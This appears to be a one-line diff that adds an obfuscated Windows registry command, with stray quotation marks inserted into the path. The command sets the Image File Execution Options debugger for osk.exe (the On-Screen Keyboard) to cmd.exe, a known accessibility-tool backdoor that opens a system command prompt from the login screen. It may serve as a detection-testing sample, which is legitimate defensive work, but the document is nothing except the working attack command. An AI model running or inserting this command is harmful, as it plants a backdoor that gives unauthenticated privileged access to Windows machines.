@@ -1,0 +1,1 @@
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\Current"Vers"ion\Image File Execution Op"tio"ns\osk.exe" /t REG_SZ /v Debugger /d “C:\windows\system32\cmd.exe” /f
